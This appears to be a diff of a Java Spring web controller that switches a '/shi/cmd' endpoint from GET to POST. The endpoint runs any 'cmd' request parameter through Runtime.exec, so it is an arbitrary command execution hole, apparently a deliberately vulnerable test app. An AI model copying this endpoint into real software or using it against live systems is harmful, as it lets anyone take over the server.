@@ -159,7 +159,7 @@ public class WebController {
     return new ResponseEntity<>(session.getId(), HttpStatus.OK);
   }
 
-  @GetMapping("/shi/cmd")
+  @PostMapping("/shi/cmd")
   public String shiCmd(@RequestParam("cmd") String cmd) {
     withProcess(() -> Runtime.getRuntime().exec(cmd));
     return "EXECUTED";
